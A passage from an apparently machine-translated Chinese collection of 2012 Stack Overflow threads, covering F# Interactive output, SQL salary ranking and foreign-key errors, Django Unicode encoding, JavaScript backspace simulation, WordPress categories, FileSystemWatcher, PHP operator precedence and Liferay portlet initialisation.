    (0.0016948, 15341.0, 0.0683535, 0.0254706, 0.002508205, 5.644664e-08,
     5.644154e-08);
    (0.00170297, 19965.1, 0.109147, 0.0558788, 0.008529023, 1.251625e-07,
     1.251524e-07);
    (0.00171787, 11642.4, 0.198148, 0.0104563, 0.003082397, 2.408784e-08,
     2.40608e-08);
    (0.00175362, 25091.0, 0.0272078, 0.0116939, 0.0004338976, 2.595698e-08,
     2.596283e-08);
    (0.00179906, 22233.8, 0.167863, 0.0785212, 0.01821428, 1.965587e-07,
     1.965953e-07);
    (0.00182353, 25225.8, 0.139036, 0.0518671, 0.009828804, 1.322449e-07,
     1.322379e-07);
    (0.00182541, 25199.9, 0.0174015, 0.000704463, 1.670998e-05, 1.688746e-09,
     1.689449e-09);
    (0.00182739, 15322.4, 0.113769, 0.0241431, 0.003957699, 6.249733e-08,
     6.250108e-08);
    (0.00185073, 28096.9, 0.0903243, 0.0460074, 0.005598434, 1.207809e-07,
     1.207781e-07);
    (0.00186179, 10742.3, 0.157882, 0.0223946, 0.005310731, 6.064575e-08,
     6.057653e-08);
    (0.00188412, 20168.5, 0.0542341, 0.0132197, 0.001001485, 3.550366e-08,
     3.550389e-08);
    (0.00191558, 14617.0, 0.0220315, 0.00631808, 0.0002016541, 1.763334e-08,
     1.762716e-08);
    (0.00202938, 17246.7, 0.191014, 0.0885049, 0.0240329, 2.826085e-07,
     2.825911e-07);
    (0.00206499, 27118.7, 0.121295, 0.0559185, 0.009172486, 1.668244e-07,
     1.668091e-07);
    (0.00206619, 27587.0, 0.101336, 0.00927483, 0.001268692, 3.027083e-08,
     3.026967e-08);
    (0.00207698, 22629.1, 0.0423963, 0.0178522, 0.001043879, 5.87145e-08,
     5.87333e-08);
    (0.00207977, 24521.9, 0.0333769, 0.010852, 0.0004951917, 3.537309e-08,
     3.537789e-08);
    (0.00208279, 22565.8, 0.195274, 0.0878693, 0.02367255, 2.949477e-07,
     2.950273e-07);
    (0.00210202, 25689.6, 0.150102, 0.0466212, 0.009519103, 1.586041e-07,
     1.585692e-07);
    (0.00213353, 18279.6, 0.110481, 0.0460817, 0.007190182, 1.61821e-07,
     1.618236e-07);
    (0.00215991, 19908.2, 0.106019, 0.027996, 0.004151994, 1.010028e-07,
     1.010277e-07);
    (0.0021624, 13411.0, 0.0101879, 0.00156348, 2.330703e-05, 5.403599e-09,
     5.40351e-09);
    (0.00219896, 18645.2, 0.153803, 0.00326262, 0.0007071175, 1.220963e-08,
     1.221263e-08);
    (0.00220626, 22662.8, 0.0791613, 0.0330102, 0.003603459, 1.235708e-07,
     1.236013e-07);
    (0.00224368, 22730.5, 0.192637, 0.0716969, 0.01903954, 2.768049e-07,
     2.768512e-07);
    (0.0022585, 8855.45, 0.0679218, 0.0132517, 0.001383893, 5.18928e-08,
     5.189262e-08);
    (0.00226939, 10575.5, 0.0633549, 0.0232409, 0.002215771, 9.245644e-08,
     9.245358e-08);
    (0.00231805, 17255.8, 0.163242, 0.0533493, 0.01237959, 2.216643e-07,
     2.216143e-07);
    (0.00238805, 10468.8, 0.111566, 0.00765519, 0.001286787, 3.381924e-08,
     3.382155e-08);
    (0.00244194, 20885.0, 0.130118, 0.0232523, 0.004209901, 1.072081e-07,
     1.071693e-07);
    (0.00245371, 23637.7, 0.00999943, 0.00266996, 3.664683e-05, 1.152522e-08,
     1.15296e-08);
    (0.00248078, 13705.4, 0.0354435, 0.00302761, 0.0001566213, 1.391716e-08,
     1.39188e-08);
    (0.00249976, 10401.0, 0.0101375, 0.00374399, 5.723007e-05, 1.763545e-08,
     1.763765e-08);
    (0.00251419, 12330.0, 0.14032, 0.0540821, 0.01121383, 2.678675e-07,
     2.67433e-07);
    (0.00253126, 14617.2, 0.0790567, 0.0242715, 0.002779797, 1.1964e-07,
     1.196354e-07);
    (0.00253237, 19349.4, 0.149013, 0.0299842, 0.006270092, 1.381995e-07,
     1.381904e-07); ...|]
val forceA2 : (float * float) [] =
  [|(1.152183801e-05, 6.847152112e-06); (1.159527248e-05, 6.950564641e-06);
    (3.88940627e-05, 2.171628586e-05); (3.540856308e-05, 2.049057636e-05);
    (7.694914693e-05, 4.340023361e-05); (4.869376162e-05, 2.699963102e-05);
    (2.151126624e-05, 1.2555728e-05); (3.689356411e-05, 2.064534492e-05);
    (1.118847991e-05, 6.935609403e-06); (3.287257348e-05, 1.883684972e-05);
    (1.059737622e-05, 6.064390781e-06); (1.137133945e-05, 6.803523081e-06);
    (3.699968172e-05, 2.076462687e-05); (1.367012342e-05, 7.821868062e-06);
    (1.482303875e-05, 8.619946234e-06); (7.206443983e-05, 4.04776391e-05);
    (1.099013049e-05, 6.274646182e-06); (2.554447821e-05, 1.417238005e-05);
    (1.075649579e-05, 6.443735521e-06); (2.191695597e-05, 1.290127346e-05);
    (1.314103716e-05, 7.393878835e-06); (1.542674261e-05, 8.917652663e-06);
    (1.292433271e-05, 7.713451577e-06); (1.285995564e-05, 7.292935822e-06);
    (6.1105296e-05, 3.446051628e-05); (2.892988156e-05, 1.674580078e-05);
    (1.225992452e-05, 7.096615222e-06); (2.23520235e-05, 1.309815065e-05);
    (1.040017946e-05, 5.894108349e-06); (2.775794247e-05, 1.603603832e-05);
    (1.198546579e-05, 7.018852063e-06); (1.21656094e-05, 6.88004385e-06);
    (2.949313881e-05, 1.754303972e-05); (2.051554157e-05, 1.225920069e-05);
    (5.490890047e-05, 3.110657576e-05); (1.102392562e-05, 6.042228233e-06);
    (4.429743159e-05, 2.548230696e-05); (1.212005637e-05, 6.624976675e-06);
    (1.373634591e-05, 8.083181268e-06); (2.644532702e-05, 1.544077237e-05);
    (1.703636004e-05, 9.751964346e-06); (1.207831717e-05, 6.839978975e-06);
    (6.383174733e-05, 3.581186119e-05); (1.040377624e-05, 5.950638734e-06);
    (8.668380318e-05, 4.788893778e-05); (1.307918229e-05, 7.192604443e-06);
    (1.102851752e-05, 6.346047713e-06); (1.420506162e-05, 8.44354591e-06);
    (2.161073911e-05, 1.233732573e-05); (7.117110295e-05, 3.772164692e-05);
    (0.0001123908063, 6.027268831e-05); (4.388147455e-05, 2.528647709e-05);
    (2.87188576e-05, 1.56980857e-05); (1.837206744e-05, 1.006371671e-05);
    (1.89142337e-05, 1.072734329e-05); (1.23701148e-05, 7.284776687e-06);
    (0.0001552132444, 8.287992637e-05); (0.0001494401676, 8.12299386e-05);
    (1.420786617e-05, 8.278702185e-06); (3.785821769e-05, 2.146896767e-05);
    (1.608515573e-05, 8.597589356e-06); (0.0002894034673, 0.0001488411542);
    (1.731014235e-05, 9.929566129e-06); (0.000502301865, 0.0002530963945);
    (4.202194533e-05, 2.250276194e-05); (2.657065078e-05, 1.467370882e-05);
    (1.489329863e-05, 7.805873157e-06); (0.0001130257906, 5.9836307e-05);
    (1.928130013e-05, 1.079347084e-05); (2.391655155e-05, 1.345411914e-05);
    (0.000191484738, 0.0001011041904); (2.935205735e-05, 1.579227728e-05);
    (3.792115226e-05, 2.157355075e-05); (2.195476371e-05, 1.140643915e-05);
    (6.545527951e-05, 3.54512449e-05); (0.0001665545576, 8.741285201e-05);
    (2.156063526e-05, 1.175851021e-05); (3.515547797e-05, 1.818581135e-05);
    (4.212857342e-05, 2.385895868e-05); (0.0001017505282, 5.626447127e-05);
    (0.0001295939183, 7.144281699e-05); (2.221501165e-05, 1.24628441e-05);
    (2.943657033e-05, 1.665799813e-05); (4.120120438e-05, 2.250618969e-05);
    (4.400353906e-05, 2.433233285e-05); (0.0004589732683, 0.0002318403503);
    (3.143908169e-05, 1.727100517e-05); (6.148942965e-05, 3.430073715e-05);
    (2.613257029e-05, 1.45408555e-05); (7.509845514e-05, 3.749756665e-05);
    (8.129017601e-05, 4.172524146e-05); (3.291650312e-05, 1.79015864e-05);
    (5.111577723e-05, 2.628372062e-05); (4.582817876e-05, 2.545648936e-05);
    (0.0006021035963, 0.0003146138425); (0.000173636052, 8.886913849e-05);
    (0.0006164044446, 0.00030818851); (4.5048114e-05, 2.384849779e-05);
    (8.104660563e-05, 4.303745921e-05); (4.303582786e-05, 2.203961282e-05);
    ...|]
val text : string =
  "1.15218e-05  6.84715e-06
1.15953e-05 6.95056e-06
3.88941e-05 2"+[18658 chars]
val it : unit = ()

> 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-31T11:17:39.020

您可以在 F# Interactive 中关闭打印声明值，但仍保留类型信息：

```
fsi.ShowDeclarationValues <- false 
```

`fsi`优点是您可以在同一会话中打开和关闭该选项。

您可能对[交互式会话的其他属性](http://msdn.microsoft.com/en-us/library/ee842563)感兴趣。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-31T10:34:17.417

使用该选项启动 fsi `--quiet`- 然后它不会打印出值。

从`fsi --help`

> ```
> --quiet                        Suppress fsi writing to stdout 
> ```

# sql-server - SQL查询找出涉及多个表的第三高薪水

> ID：12213271
> 
> 赞同：1
> 
> 时间：2012-08-31T10:11:25.110
> 
> 标签：sql-server

我有两张桌子..

人员：

```
empid(primary key)
firstname
lastname
email 
```

细节：

```
Did(primary key)
salary
designation
empid 
```

现在我想选择薪水第三高的员工中的, `firstname`。`lastname``salary`

另外，如果您能建议我一个网站，我可以在其中找到带有解决方案的 SQL 查询练习（我不需要在线解释器，我有 SQL Server 2008 可以练习），我已经完成了 w3schools（这很棒）但是我现在需要练习，我尝试了 sql.ex.ru，但没有那么有用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:13:56.087

```
 select firstname, lastname, salary 
 from 
 (
 select 
    employee.*, details.salary,
    row_number() over (order by salary desc) salaryrank
 from 
      employee
 inner join 
      details
           on employee.empid = details.empid
 ) v
 where salaryrank=3 
```

至于 SQL 问题的解决方案，为什么不看看 stackoverflow 本身呢？找一个问题，看看你怎么能得到答案。然后看看评分最高的答案是什么

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-07-31T21:18:31.803

假设您有具有以下字段值的表

**人**

![在此处输入图像描述](../Images/7a2aaaf0f43f6f0172df60a65b6dc88f.png)

**细节**

![在此处输入图像描述](../Images/97cf046883185514540e0ef12ab7f1c3.png)

现在如果你想找到**第三高的薪水**。那么，下面的查询会给你下面的结果集。

![在此处输入图像描述](../Images/4ac30ce3e8bf34390c53f67b68fc4d5f.png)

**输出：**

![在此处输入图像描述](../Images/a85adf74d7ccc35b1db72edf7a415ced.png)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T10:27:48.940

```
SELECT 
    p.firstname,
    p.lastname, 
    d.salary 
FROM 
    Persons p,
    Details d 
where 
    p.empid=d.empid  
order by 
    d.btID desc 
limit 2,1; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T10:17:13.647

在下面找到答案。

```
select * from empsal e where
3 =(select count(distinct empsal) from empsal where e.empsal<=empsal); 
```

如果您需要第二个最高工资，请将“3”替换为“2”。

# django - 如何在 django 中编辑通过表单接收到的数据？

> ID：12213272
> 
> 赞同：2
> 
> 时间：2012-08-31T10:11:24.813
> 
> 标签：django, forms, unicode, utf-8, request

我正在学习 Django。有一个搜索栏。这旨在与俄语单词一起使用。这个词被一个简单的形式抓住了。

如何在开头将单词编码为 utf-8？因此，它会在某个时候创建​​ UnicodeEncodeError。或者有什么方法可以改变原来的请求？

数据库设置为 utf-8。

谢谢你。

这是回溯

```
Traceback:
File "/usr/local/lib/python2.6/dist-packages/django/core/handlers/base.py" in get_response
  111\.                         response = callback(request, *callback_args, **callback_kwargs)

File "/home/teodor/moldova/search/views.py" in results
  27\.   return render_to_response(template_name, locals(), context_instance = RequestContext(request))

File "/usr/local/lib/python2.6/dist-packages/django/shortcuts/__init__.py" in render_to_response
  20\.     return HttpResponse(loader.render_to_string(*args, **kwargs), **httpresponse_kwargs)

File "/usr/local/lib/python2.6/dist-packages/django/template/loader.py" in render_to_string
  176\.         return t.render(context_instance)

File "/usr/local/lib/python2.6/dist-packages/django/template/base.py" in render
  140\.             return self._render(context)

File "/usr/local/lib/python2.6/dist-packages/django/template/base.py" in _render
  134\.         return self.nodelist.render(context)

File "/usr/local/lib/python2.6/dist-packages/django/template/base.py" in render
  823\.                 bit = self.render_node(node, context)

File "/usr/local/lib/python2.6/dist-packages/django/template/debug.py" in render_node
  74\.             return node.render(context)

File "/usr/local/lib/python2.6/dist-packages/django/template/loader_tags.py" in render
  123\.         return compiled_parent._render(context)

File "/usr/local/lib/python2.6/dist-packages/django/template/base.py" in _render
  134\.         return self.nodelist.render(context)

File "/usr/local/lib/python2.6/dist-packages/django/template/base.py" in render
  823\.                 bit = self.render_node(node, context)

File "/usr/local/lib/python2.6/dist-packages/django/template/debug.py" in render_node
  74\.             return node.render(context)

File "/usr/local/lib/python2.6/dist-packages/django/template/loader_tags.py" in render
  123\.         return compiled_parent._render(context)

File "/usr/local/lib/python2.6/dist-packages/django/template/base.py" in _render
  134\.         return self.nodelist.render(context)

File "/usr/local/lib/python2.6/dist-packages/django/template/base.py" in render
  823\.                 bit = self.render_node(node, context)

File "/usr/local/lib/python2.6/dist-packages/django/template/debug.py" in render_node
  74\.             return node.render(context)

File "/usr/local/lib/python2.6/dist-packages/django/template/loader_tags.py" in render
  62\.             result = block.nodelist.render(context)

File "/usr/local/lib/python2.6/dist-packages/django/template/base.py" in render
  823\.                 bit = self.render_node(node, context)

File "/usr/local/lib/python2.6/dist-packages/django/template/debug.py" in render_node
  74\.             return node.render(context)

File "/usr/local/lib/python2.6/dist-packages/django/template/loader_tags.py" in render
  62\.             result = block.nodelist.render(context)

File "/usr/local/lib/python2.6/dist-packages/django/template/base.py" in render
  823\.                 bit = self.render_node(node, context)

File "/usr/local/lib/python2.6/dist-packages/django/template/debug.py" in render_node
  74\.             return node.render(context)

File "/usr/local/lib/python2.6/dist-packages/django/template/base.py" in render
  1178\.                     _dict = func(*resolved_args, **resolved_kwargs)

File "/home/teodor/moldova/search/templatetags/search_tags.py" in pagination_links
  23\.   params = urllib.urlencode(raw_params)

File "/usr/lib/python2.6/urllib.py" in urlencode
  1267\.             v = quote_plus(str(v))

Exception Type: UnicodeEncodeError at /search/results/
Exception Value: 'ascii' codec can't encode characters in position 0-4: ordinal not in range(128) 
```

我搜索了单词：Найти

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T10:15:04.387

我对此没有太多经验，但根据[Jonathan “Wolf” Rentzsch 的在 web 上使用 UTF-8 的指南](http://rentzsch.tumblr.com/post/9133498042/howto-use-utf-8-throughout-your-web-stack)，您可能想尝试将`accept-charset="UTF-8"`属性添加到您的`<form>`标签中。

你在哪里看的`UnicodeEncodeError`？你能给我们看一些代码吗？

**编辑：**啊，好吧。是的——我*认为*Django 将所有文本都提供为 Unicode 对象。如果我正确理解了回溯，那么当您调用`str`此 unicode 对象以将其与`urllib.quote_plus`.

我*认为*您需要提供`urllib.quote_plus`以 ASCII 编码的文本（请参阅[是否有可用于 Python 2.6.5 中的 urllib.quote 和 urllib.unquote 的 unicode-ready 替代品？](https://stackoverflow.com/questions/5557849/is-there-a-unicode-ready-substitute-i-can-use-for-urllib-quote-and-urllib-unquot)）。

根据[这个问题](https://stackoverflow.com/questions/3114176/simple-ascii-url-encoding-with-python)，我认为你可以这样做：

```
import unicodedata
v_as_ascii = unicodedata.normalize('NFKD', v.decode('UTF-8')).encode('ascii', 'ignore')
v = quote_plus( v_as_ascii ) 
```

（不过我还没有测试过这些，所以我可能完全错了。希望有这方面经验的人能过来。）

# javascript - 使用 Javascript 代码在文本框上触发退格事件

> ID：12213275
> 
> 赞同：0
> 
> 时间：2012-08-31T10:11:51.333
> 
> 标签：javascript, textbox, dom-events, backspace

是否可以使用 Javascript 在文本框上触发退格事件？这应该清除光标位置左侧的字符。我知道退格的事件代码是 8，但我不知道如何使用代码触发它。

特定于 Internet Explorer 8 的解决方案会有很大帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T10:24:07.343

看看这个相关的问题：[模拟 JavaScript 键事件](https://stackoverflow.com/questions/596481/simulate-javascript-key-events)

就个人而言，我认为直接编辑文本会是一种更好、更简洁的方法，删除光标位置之前的字符。请参阅[如何在 textarea 中获取插入符号位置](https://stackoverflow.com/questions/263743/how-to-get-caret-position-in-textarea)

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-08-31T10:22:02.840

将值从末尾简单地修剪一个字符会容易得多..

```
var TheTextBox = document.getElementById("id");
TheTextBox.value = TheTextBox.value.substring(0, TheTextBox.length - 1); 
```

# php - 我们如何处理具有多个父类别的子类别？

> ID：12213277
> 
> 赞同：1
> 
> 时间：2012-08-31T10:11:58.147
> 
> 标签：php, wordpress

假设我有一个像 HOME| 这样的菜单 食谱| 视频 | 厨师长

在（食谱标签）中，我展示了一些类别和子类别。我在视频选项卡中想要的相同类别和子类别。就像我想要的是：我会将一些视频帖子分配给同一类别，将一些普通帖子分配给同一类别。当我进入网站并来自食谱选项卡和单击某个类别（我们能否获取我们单击此类别并来自该选项卡的父选项卡菜单的值）。这可能吗。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T10:14:55.570

实际上你错了，你不能以拥有多个父母的方式创建子类别。在 wordpress 中是不允许的。您必须为具有相同名称但名称不同的父母创建单独的类别。

谢谢

# c# - Win7下通过网络更改文件时FileSystemWatcher不起作用

> ID：12213279
> 
> 赞同：1
> 
> 时间：2012-08-31T10:12:09.823
> 
> 标签：c#, networking, windows-7, filesystemwatcher

首先，让我试着解释一下我的工作：我有一个在 Windows 7 启动时运行的进程（注册表中的运行条目）。需要通知该进程有关位于同一台计算机上的特定文本文件的更改，但更改来自另一个系统通过本地网络上的 SMB，即有一个名为 c:\temp\MyFileToWatch.txt 的文件这台计算机，并且此文件已从本地子网上的另一台计算机更改（共享 c:\temp）。

我在 C# 中实现了一个文件系统观察器，如下所示：

```
FileSystemWatcher incoming = new FileSystemWatcher();
        incoming.Path = @"c:\temp\";
        incoming.NotifyFilter = NotifyFilters.FileName |
                                NotifyFilters.LastAccess |
                                NotifyFilters.LastWrite |
                                NotifyFilters.DirectoryName;
        incoming.Filter = "MyFileToWatch.txt";
        incoming.Changed += new FileSystemEventHandler(OnChanged);
        incoming.EnableRaisingEvents = true; 
```

在 OnChanged 中，我输出如下消息：

```
public static void OnChanged(object source, FileSystemEventArgs e)
    {
        Console.WriteLine("{0} : MyFileToWatch.txt changed", System.DateTime.Now);
    } 
```

我现在遇到的问题是文件实际上已更改，但我没有收到通知，至少只要 MyFileToWatch.txt 没有在当前计算机上的任何程序中打开。但是，如果我在编辑器中打开此文件，则会正确注意到文件更改，并且实际上会调用 OnChanged。如果文件没有在本地打开，我不会收到任何事件。

这是我运行进程时日志的样子，并且 MyFileToWatch.txt 被多次更改（我只得到第一次更改）：

```
8/31/2012 10:24:58 AM : MyFileToWatch.txt Changed 
```

但是，如果我的文件在 Ultraedit 之类的编辑器中打开，我的日志如下所示：

```
8/31/2012 10:10:37 AM : MyFileToWatch.txt Changed
8/31/2012 10:11:08 AM : MyFileToWatch.txt Changed
8/31/2012 10:11:15 AM : MyFileToWatch.txt Changed
8/31/2012 10:11:18 AM : MyFileToWatch.txt Changed
8/31/2012 10:11:20 AM : MyFileToWatch.txt Changed
8/31/2012 10:11:31 AM : MyFileToWatch.txt Changed
8/31/2012 10:11:48 AM : MyFileToWatch.txt Changed
8/31/2012 10:11:54 AM : MyFileToWatch.txt Changed
8/31/2012 10:11:59 AM : MyFileToWatch.txt Changed
8/31/2012 10:12:06 AM : MyFileToWatch.txt Changed
8/31/2012 10:12:25 AM : MyFileToWatch.txt Changed 
```

有人对这种奇怪的行为有解释吗？奇怪的是，在windows XP下，这两种情况都可以，但是在Win7下，不行。

即使文件未在编辑器中本地打开，如何可靠地获取有关文件更改的信息？

非常感谢。

# php - PHP 中 or 运算符的行为

> ID：12213283
> 
> 赞同：48
> 
> 时间：2012-08-31T10:12:28.193
> 
> 标签：php, or-operator

我试图了解`or`操作员的行为。请参阅以下示例：

```
$e = false || true;
var_dump($e); 
```

输出如预期：`bool(true);`

```
$f = false or true;
var_dump($f); 
```

输出如预期：`bool(false)`. 我理解这一点的方式是`=`比 具有更高的优先级`Or`，所以这`$f`就是分配给的原因`false`。

但是下面的代码与我的想法完全相反。我认为`$foo`将分配给`5`然后与自身进行比较。但是`$foo`只有当`$foo`设置了这意味着它正在检查`$foo`之前是否分配过任何东西时，才会分配 5 给它。

```
$foo or $foo = 5; 
```

谁能解释为什么会这样？

* * *

## 回答 #1

> 赞同：49
> 
> 时间：2012-08-31T11:47:47.593

基础：

1.  赋值表达式导致赋值。

    这意味着什么？`$foo = 'bar'`是一个表达式，其中赋值运算符`=`分配一个值。表达式本身总是返回一个值。就像表达式`1 + 2`产生值一样`3`，表达式`$foo = 'bar'`产生值`'bar'`。这就是为什么它有效：

    ```
    $foo = $bar = 'baz'; // which is: $foo = ($bar = 'baz'); 
    ```

2.  布尔运算是短路运算。如果不需要，双方并不总是被评估。`true || false`总是`true`整体的，因为左手操作数是`true`，所以整个表达式必须是`true`。`false`这里甚至没有被评估。

3.  [运算符优先级](http://php.net/manual/en/language.operators.precedence.php)指示表达式的部分按什么顺序分组到子表达式中。高优先级运算符与其操作数在低优先级运算符之前分组。

所以：

> ```
> $e = false || true; 
> ```

`false || true`正在评估，这将导致值`true`分配给`$e`。运算符的`||`优先级高于`=`，因此`false || true`被分组到一个表达式中（与 相对`($e = false) || true`）。

> ```
> $f = false or true; 
> ```

这里 now`or`的优先级低于*，*`=`这意味着赋值操作在之前被分组到一个表达式中`or`。所以首先`$f = false`评估表达式，其结果是`false`（见上文）。那么你有一个简单的表达式`false or true`，它接下来被评估并导致`true`，但没有人关心。

评估工作如下：

```
1\. $f = false or true;
2\. ($f = false) or true;  // precedence grouping
3\. false or true;         // evaluation of left side ($f is now false)
4\. true;                  // result 
```

现在：

> ```
> $foo or $foo = 5; 
> ```

同样，这里`$foo = 5`具有更高的优先级并被视为一个表达式。由于它出现在运算符的右侧`or`，因此仅在必要时才对表达式进行评估。这取决于`$foo`最初是什么。如果`$foo`是`true`，则根本不会评估右侧，因为`true or ($foo = 5)`必须是`true`整体的。如果`$foo`最初有一个错误值，则评估右侧并`5`分配给`$foo`，这导致`5`，这是真值，这意味着整体表达式是`true`，没有人关心。

```
1\. $foo or $foo = 5;
2\. $foo or ($foo = 5);   // precedence grouping
3\. false or ($foo = 5);  // evaluation of left side
4\. false or 5;           // evaluation of right side ($foo is now 5)
5\. true;                 // result 
```

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2012-08-31T10:19:08.380

根据[有关逻辑运算符的 php.net 网页](http://www.php.net/manual/en/language.operators.logical.php)：

这：

```
$e = false || true; 
```

像这样的行为：

```
$e = (false || true) // If false is true, then $e = false. Otherwise true 
```

这：

```
$f = false or true; 
```

会像这样：

```
($f = false) or true; // $f = false is true, as the assignment succeeded 
```

这：

```
$foo or $foo = 5; 
```

会像这样：

```
$foo or ($foo = 5) // foo = undefined or foo = 5, so foo = 5 
```

对于最后一个，undefined 基本上等于 false，因此 foo 等于 5。

此外，这里是运算符优先顺序的链接：[http ://www.php.net/manual/en/language.operators.precedence.php](http://www.php.net/manual/en/language.operators.precedence.php)

**更新：**

好的，现在让我们进入重点。就像我们都知道使用获取的查询时一样：

```
while($row = @mysql_fetch_assoc($result)) 
```

我们都知道 while 循环只在 上执行`true`，因此`$row = @mysql_fetch_assoc($result)`返回 true。

与达里克的问题相同。

```
$foo or $foo = 5; 
```

基本上是：

```
$foo or ($foo = 5); 
```

基本上是：

```
$foo = undefined or ($foo = 5); // $foo = 5 actually returns true 
```

这也是

```
$foo = undefined or true; 
```

正如我之前提到的，undefined = false，因此 $foo = 5（因为这是正确的陈述）。

我希望每个人都能理解。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-31T10:24:49.273

```
$foo or $foo = 5;

Suppose let say $foo=true or $foo=5; 
```

在这里它不会在或运算符表达式之后计算，所以输出将是 $foo=1 现在表达式是

`$foo=false or $foo=5;`

在这里，它将在或 as = 更高优先级之后 评估，因此它将`$foo`评估哪个优先级，因此`$foo=5`输出将为`5``$foo=false or true``$foo=false``false or true``false`

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-31T10:25:36.050

```
<?php
$foo = false;
$foo or ($foo = '5');
echo $foo;
?> 
```

选中此项，您可以为 分配值“5” `$foo`。

比较比`or` `=`具有高优先级..这是事实.... :)

# java - Liferay：从 init(PortletConfig) 中获取 PortletId 和 Plid [即，没有请求对象，只有 PortletConfig]

> ID：12213294
> 
> 赞同：1
> 
> 时间：2012-08-31T10:13:31.527
> 
> 标签：java, liferay, portlet, init

我想同时获取这两个值，并且由于在加载 portlet 时会执行 init(Portletconfig)，因此我认为这些值是否应该可用没有任何疑问。

对于 portletId 我试过了

```
String portletId = ((PortletConfigImpl) portletConfig).getPortletId(); 
```

但似乎我不能。猜猜这是因为 impl 在另一个 jar 中，不应该从 portlet 访问

顺便说一句，我的主要目标是将两个参数都传递给另一个非请求上下文，这样我就可以做到

```
final PortletPreferences prefs = PortletPreferencesFactoryUtil.getLayoutPortletSetup(LayoutLocalServiceUtil.getLayout(plid), portletId); 
```

实时读取 portlet 的首选项。如果有任何其他方式可以从 init() 中表明这一点，比如获得整个偏好，那就足够了

**编辑：**我找到了一种不同的方法，并打开了一个新问题，稍微改变 [了 Liferay：从 init() 获取 PortletID 和 companyID](https://stackoverflow.com/questions/12322904/liferay-get-portletid-and-companyid-from-init)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T14:47:55.077

所以...如果我理解正确，您的目标是在您的 Portlet 类的 init 方法中读出 portlet 首选项。

根据 API，`PortletPreferences`可以从实例中检索对象，该实例在和类`PortletRequest`中都可用。例如：`doView()``processAction()`

```
public void doView(RenderRequest request, RenderResponse response) throws PortletException, IOException {
    String name = request.getPreferences().getValue("name", null);

    Writer writer = response.getWriter();
    writer.write("Hello, "+name+"!");
} 
```

需要注意的是，在 Liferay 中，portlet 首选项默认只存在于页面范围内，或者，在 Liferay 术语中，a`Layout`由 a 标识，是`plid`页面布局 ID 的简写。

关于您的`init()`方法，portlet API 规定应该在“处理第一个 portlet 请求之前”调用此方法。在 Liferay 中，您的 portlet 类的一个新实例（并且只有一个实例）是在**部署时**创建的，而不是在您在页面上添加 portlet 时创建的。实例化后，门户容器将调用`init()`portlet 类的方法。

结论：在您的 portlet 类的方法中检索 portlet 首选项完全没有意义`init()`，因为此时 portlet 没有任何`Layout`应该从中检索首选项的上下文（读取：）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-06T07:54:47.613

如果您想获取 portlet 初始化的配置，那么您可以覆盖`init(PortletConfig config)`方法 from`GenericPortlet`

> 公共类 MyLiferayTestPortlet 扩展 MVCPortlet {
> 
> ```
>  @Override
>   public void init(PortletConfig config) throws PortletException {
>     System.out.println("~~~~~~~~~~~~~ ~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~ init");
>     super.init(config);
>     Enumeration<String> parameterNames = config.getInitParameterNames();
>     while(parameterNames.hasMoreElements()) {
>         String name = parameterNames.nextElement();
>         System.out.println("Parameter: " + name + " = " + config.getInitParameter(name));
>     }
>     System.out.println("~~~~~~~~~~~~~ ~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~ /init");
>   }
> } 
> ```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-07T20:20:47.773

为什么不将首选项检索代码放入渲染阶段，并在首选项被验证时制作一个标志？这样，您只需执行一次。

For example, in the controller you have have a static field

```
private static boolean checked = false; 
```

And then in the render phase, you check

```
if(!checked) {
//validate preferences
checked = true;
} 
```

# sql - 引用的表中没有主键或候选键

> ID：12213301
> 
> 赞同：33
> 
> 时间：2012-08-31T10:14:04.763
> 
> 标签：sql, sql-server-2012

> 错误：引用表 'dbo.Customers' 中没有与外键 'FK_Reservation_Customers_FrstNme FOREIGN KEY' 中的引用列列表匹配的主键或候选键

```
DROP TABLE dbo.Customers;
DROP TABLE dbo.Staff;
DROP TABLE dbo.Rooms;
DROP TABLE dbo.Reservation;
GO
CREATE TABLE "Customers"(

    CustomerID int IDENTITY (1,1) NOT NULL,
    FirstName nvarchar(20) NULL,
    LastName nvarchar(20) NULL,
    StreetNo int NULL,
    City nvarchar(20) NULL,
    PostCode nvarchar(20) NULL,
    Email nvarchar(50) NULL,

    CONSTRAINT PK_Customers PRIMARY KEY
    (
        CustomerID
    )
)
CREATE TABLE "Staff"(

    StaffID nvarchar(20) NOT NULL,
    Pass nvarchar(20) NOT NULL,

    CONSTRAINT PK_Staff PRIMARY KEY
    (
        StaffID
    )
)
CREATE TABLE "Rooms"(

    RoomNo int NOT NULL,
    RoomType nvarchar(20) NULL,
    PricePerNight money NULL,
    MaximumOccupancy int NULL,
    No0fBeds int NULL,
    NoOfBathrooms int NULL,
    Entertainment bit NULL,
    RoomService bit NULL,
    Gym bit NULL,

    CONSTRAINT PK_Rooms PRIMARY KEY
    (
        RoomNo
    )
)
CREATE TABLE "Reservation"(

    ReservationID int IDENTITY (1,1) NOT NULL,
    CustomerID int NOT NULL,
    FirstName nvarchar(20) NULL,
    LastName nvarchar(20) NULL,
    RoomType nvarchar(20) NULL,
    RoomNo int NOT NULL,
    CheckInDate date NULL,
    CheckOutDate date NULL,

    CONSTRAINT PK_Reservation PRIMARY KEY
    (
        ReservationID
    ),
    CONSTRAINT FK_Reservation_Customers_CustID FOREIGN KEY
    (
        CustomerID
    )   
        REFERENCES dbo.Customers
        (
            CustomerID
        ),
    CONSTRAINT FK_Reservation_Customers_FrstNme FOREIGN KEY
    (
        FirstName
    )
        REFERENCES dbo.Customers
        (
            FirstName
        )
    ) 
```

